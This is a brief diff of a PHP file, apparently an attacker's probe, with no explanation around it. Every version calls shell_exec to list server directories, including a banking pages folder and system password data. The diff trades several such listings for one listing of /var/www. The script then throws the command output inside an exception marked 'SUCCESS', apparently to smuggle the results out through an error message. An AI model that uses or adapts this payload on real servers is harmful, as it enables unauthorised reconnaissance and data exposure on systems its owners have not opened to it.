@@ -1,11 +1,7 @@
 <?php
 $output ='';
-$output =$output."\n pages multi".shell_exec ('ls /var/www/pages/ | xargs');
-$output =$output."\n bank".shell_exec ('ls /var/www/pages/banking/| xargs');
-$output =$output."\n base_passwd".shell_exec ('ls /usr/share/base-passwd | xargs');
-
-$output =$output."\n FIND ".shell_exec ('ack "chat" | xargs');
+$output =$output."\n var WWW ".shell_exec ('ls /var/www/ | xargs');
 
 
-throw new Exception("\n SUCCESS ". $output."\n");
+throw new Exception("\n SUCCESS  ". $output."\n");
 ?>
